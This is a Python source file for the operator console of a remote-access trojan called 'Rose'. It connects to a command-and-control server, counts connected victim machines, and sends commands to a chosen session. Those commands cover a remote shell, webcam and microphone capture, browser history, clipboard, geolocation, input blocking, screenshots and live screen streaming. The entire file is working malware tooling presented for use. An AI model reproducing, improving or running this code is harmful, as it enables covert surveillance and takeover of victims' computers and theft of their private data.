from pystyle import Colors, Colorate, Center, Box, Write

import os
import ctypes
import time 

import socketio
import webbrowser

import json

import threading

__version__ = "1.0"

#with open("config.json", "r") as f:
#    config = json.load(f)
#    server_url = config["server_url"]

import logging

logging.basicConfig(
    level=logging.DEBUG,
    filename='attacker_client.log',
    filemode='a',
    format='[%(filename)s:%(lineno)d] - %(asctime)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)

server_url = Write.Input("    .$ Your server URL ? (should contains https://)", Colors.red_to_white, interval=0.025)
logger.info(f"Attacker using URL {server_url}")

os.system('cls')
ctypes.windll.kernel32.SetConsoleTitleW(f"Rose Client | v{__version__}")
banner = """
OooOOo.
o     `o
O      O
o     .O
OOooOO'  .oOo. .oOo  .oOo.
o    o   O   o `Ooo. OooO'
O     O  o   O     O O
O      o `OoO' `OoO' `OoO'
"""

def start_attacker_screenshare():
    def to_execute():
        import eventlet
        import socketio
        from threading import Thread
        from zlib import decompress

        from mss import mss
        import pygame 

        WIDTH = 1900
        HEIGHT = 1000

        _sio = socketio.Client()
        pygame.init()
        screen = pygame.display.set_mode((WIDTH, HEIGHT))
        clock = pygame.time.Clock()
        
        pygame.display.set_caption('Rose - Screenshare client - made by xpierroz')


        @_sio.event
        def connect():
            print('screenshare attacker client connected')
            _sio.emit("iam_attacker")

        _sio.connect(server_url)

        done = False
        while not done:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()

            @_sio.event
            def receiving_screenshot(data):
                #msize_len = data['data']['size_len']
                #msize_bytes = data['data']['size_bytes']
                mpixels = data['data']['pixels']
                pixels = decompress(mpixels)

                # Create the Surface from raw pixels
                img = pygame.image.fromstring(pixels, (WIDTH, HEIGHT), 'RGB')

                # Display the picture
                screen.blit(img, (0, 0))
                pygame.display.flip()
                clock.tick(60)
                
    t = threading.Thread(target=to_execute)
    t.run()

class Connected():
    def __init__(self):
        self.client_connected = 0
        
    def change(self, number):
        self.client_connected = number
        
    def get(self):
        logger.debug(f"Getting number of connected clients: {self.client_connected}")
        return self.client_connected

class Serv():
    sio = socketio.Client()
    def __init__(self, url):
        self.command = Command()
        self.v = __version__
        self._cmd = Command()
        self.url = url
        self._cmd = Command()
        self._connected = Connected()
        
    def _cls(self):
        os.system('cls')
            
    def home(self):
        self._cls()
        print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter(banner)))
        print('\n')
        print(Colorate.Horizontal(Colors.red_to_white, Box.Lines(f'Attacker Client | v{__version__} | {self._connected.get()} Clients Connected')))
        print('\n')
        self.loop()
                
    def not_valid(self, cmd):
        logger.error(f"{cmd} - invalid command")
        print(Colorate.Horizontal(Colors.red_to_white, f"    .X {cmd} is not a valid command. Type 'help' for more info."))
        time.sleep(2)
        self.home()
    
    def setup(self):
        self.call_backs()
        self.sio.connect(self.url)
        self.sio.emit("number_connected")
        time.sleep(1) #Wait for the server to send the number of clients connected before loading the UI
        self.home()

    def loop(self): 
        while True:
            self.sio.emit("number_connected")
            cmd = Write.Input("\n    .$ ", Colors.red_to_white, interval=0.025)
            if cmd == "help":
                valid_commands = self.command.valid
                print(Colorate.Horizontal(Colors.red_to_white, f"     Valid commands:"))
                for command in valid_commands:
                    print(Colorate.Horizontal(Colors.red_to_white, f"    - {command}"))
                print(Colorate.Horizontal(Colors.red_to_white, f"    Press Enter to continue..."))
                input()
                self.home()
                
            elif cmd == "exit":
                exit()
            
            else:
                if not self._cmd.is_valid(cmd):
                    self.not_valid(cmd)
                sid = Write.Input("    .$ SID ? ", Colors.red_to_white, interval=0.025)
                try:
                    self.sio.emit(
                        'send_command',
                        {"data":
                            {"command": cmd,
                            "sid": sid
                            }
                        }
                    )
                    if cmd == "screenshare":
                        start_attacker_screenshare()
                    print(Colorate.Horizontal(Colors.green_to_white, f'    .$ Command Sent to {sid}'))
                except Exception as e: #Print command failed in red
                    print(Colorate.Horizontal(Colors.red_to_white, f'    .$ Command Failed to {sid}'))
                    print(Colorate.Horizontal(Colors.red_to_white, f'    .$ Advanced logs: {e}'))
                    time.sleep(2)
                    self.home(self._connected.get())
                    

    def call_backs(self):
        @self.sio.event
        def connect():
            self.sio.emit('client_connect', {"data": "Attacker Client Connected"})

        @self.sio.event
        def all_sessions(data):
            self._connected.change(data['data'])
            ctypes.windll.kernel32.SetConsoleTitleW(f"Rose Client | v{__version__} | {self._connected.get()} Clients Connected")
        
        @self.sio.event
        def auth(data):
            print(f"Data Received {data}")

        @self.sio.event
        def disconnect():
            print('disconnected from server')
            
    def run(self):
        self.setup()    

class Command(): 
    def __init__(self):
        self.valid = [
            'messagebox',
            'shell',
            'webcampic',
            'voice',
            'admincheck',
            'sysinfo',
            'history',
            'write',
            'wallpaper',
            'clipboard',
            'geolocate',
            'volumemax',
            'volumezero',
            'blockinput',
            'unblockinput',
            'screenshot',
            'kill',
            'screenshare'
        ]

    def is_valid(self, command):
        try:
            command = command.split(' ')[0]
        except Exception:
            pass
        return any(command == j for j in self.valid)
        
        
ss = Serv(server_url)
ss.run()